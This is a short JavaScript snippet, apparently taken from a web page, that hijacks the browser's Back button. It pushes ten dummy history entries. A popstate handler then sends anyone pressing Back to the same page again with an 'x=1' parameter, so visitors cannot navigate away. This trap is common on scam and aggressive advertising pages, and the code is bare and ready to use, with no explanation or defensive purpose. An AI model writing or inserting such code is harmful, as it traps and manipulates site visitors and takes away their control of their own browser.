        ! function () { 
            var t; 
			var tmp=window.location.href;
            try { 
                for (t = 0; 10 > t; ++t) history.pushState({}, "", ""); 
                onpopstate = function (t) { 
                    t.state && location.replace(getUrlWithParam("x=1")) 
                } 
            } catch (o) {} 
        }();
		
			function getUrlWithParam(param)
			{
				var url = window.location.href;
				
				if (url.includes("x="))
				{
					url = url.replace(/(x=)[0-9]{1,2}/,param)
				}
				else
				{
					url = url + "&" + param;
				}
				
				return url; 
			}